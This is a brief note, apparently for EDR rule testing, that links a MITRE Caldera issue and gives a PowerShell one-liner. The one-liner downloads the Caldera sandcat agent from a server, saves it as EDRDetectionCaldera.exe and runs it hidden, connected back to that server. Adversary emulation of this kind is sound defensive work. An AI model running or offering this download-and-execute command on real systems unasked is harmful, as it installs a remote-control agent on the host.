Tools: Conatins all the tools needed for Rules Testing 
https://github.com/mitre/caldera/issues/3064


$server="http://10.99.156.91:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\EDRDetectionCaldera.exe"} | stop-process -f;rm -force "C:\Users\Public\EDRDetectionCaldera.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\EDRDetectionCaldera.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\EDRDetectionCaldera.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
